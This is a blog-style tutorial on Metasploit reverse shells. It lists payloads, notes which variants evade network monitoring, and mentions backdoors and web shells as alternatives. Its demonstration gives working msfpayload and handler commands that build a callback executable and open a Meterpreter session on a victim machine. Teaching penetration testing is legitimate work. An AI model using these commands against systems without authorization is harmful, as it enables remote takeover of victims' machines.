---
title: "How to Use a Reverse Shell in Metasploit"
description: "Learn more about the Metasploit framework."
icon: "code"
draft: false
---

Reverse shells are a crucial technique in penetration testing and ethical hacking, enabling attackers to gain access to a remote machine by reversing the connection back to the attacker's machine. This blog post provides a comprehensive guide on using reverse shells in Metasploit, detailing the process step-by-step and explaining when and why to use reverse shells.


## List of Metasploit Reverse Shells

To list all available reverse shells in Metasploit, use the following command:

```bash
./msfpayload -l | grep reverse
```

As a general rule, it's recommended to use Meterpreter payloads because they provide extensive post-exploitation capabilities such as `railgun`, post modules, and various Meterpreter commands.

## Windows Common Reverse Shell

For Windows, the most commonly used reverse shells include:
- `windows/meterpreter/reverse_tcp`
- `windows/meterpreter/reverse_http`
- `windows/meterpreter/reverse_https`

The HTTP and HTTPS variants can help in evading network monitoring due to their less suspicious traffic patterns.

## Linux Common Reverse Shell

For Linux, the preferred reverse shells are:
- `linux/x86/meterpreter/reverse_tcp`
- `linux/x64/meterpreter/reverse_tcp`

Additionally, the `linux/x86/shell_reverse_tcp` payload has proven to be highly stable.

## When to Use a Reverse Shell

Consider using a reverse shell in the following scenarios:
- The target machine is behind a different private network.
- The target machine's firewall blocks incoming connections.
- The payload cannot bind to the required port.
- You are unsure of the best option to use.

## When a Reverse Shell Isn't Needed

Reverse shells might not be necessary if:
- You can backdoor an existing service (e.g., adding a user to an SSH server).
- You can leave a web shell on a web server supporting server-side programming languages like PHP, ASP, or ASP.net.
- The target machine runs remote admin tools like VNC, Remote Desktop, or SMB.

## How to Set Up for a Reverse Shell During Payload Generation

When generating a reverse shell payload with `msfpayload` or `msfvenom`, you need to configure:

- **LHOST**: The IP address to which the target machine will connect. Ensure it's reachable by the target machine, often requiring public IP configuration and port forwarding.
- **LPORT**: The port on which the target machine will connect.

For the listener configuration:
- **LHOST**: The IP address for the listener to bind to.
- **LPORT**: The port for the listener to bind to.

Ensure the listener is started before executing the reverse shell.

## Demonstration

### Step 1: Generate the Executable Payload

On the attacker's machine (Box A), generate the payload:

```bash
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=4444 X > /tmp/iambad.exe
```

### Step 2: Copy the Executable Payload to Box B

Transfer the payload executable to the victim's machine (Box B).

### Step 3: Set Up the Payload Handler on Box A

Configure and start the payload handler on Box A:

```bash
./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.123
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > run
```

### Step 4: Execute the Malicious Executable on Box B

On Box B, execute the payload by double-clicking the `iambad.exe` file.

### Step 5: View the Meterpreter Session on Box A

Once the payload is executed, you should see the Meterpreter session open on Box A:

```bash
[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2024-06-25 19:03:43 -0500
meterpreter >
```

The `meterpreter >` prompt indicates an active session, allowing you to interact with the target system.

## Conclusion

Reverse shells are a powerful feature in Metasploit for gaining access to remote systems. By following this guide, you can effectively set up and use reverse shells for your penetration testing needs. Always ensure you have proper authorization before conducting any penetration tests.